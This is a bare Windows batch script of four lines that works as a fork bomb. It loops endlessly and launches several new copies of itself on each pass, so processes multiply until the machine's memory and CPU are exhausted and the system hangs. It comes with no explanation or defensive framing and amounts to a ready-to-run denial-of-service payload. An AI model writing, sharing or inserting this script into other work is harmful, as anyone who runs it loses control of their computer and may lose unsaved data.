@echo off
:main
start %0 | start %0 & start %0 | start %0
goto main
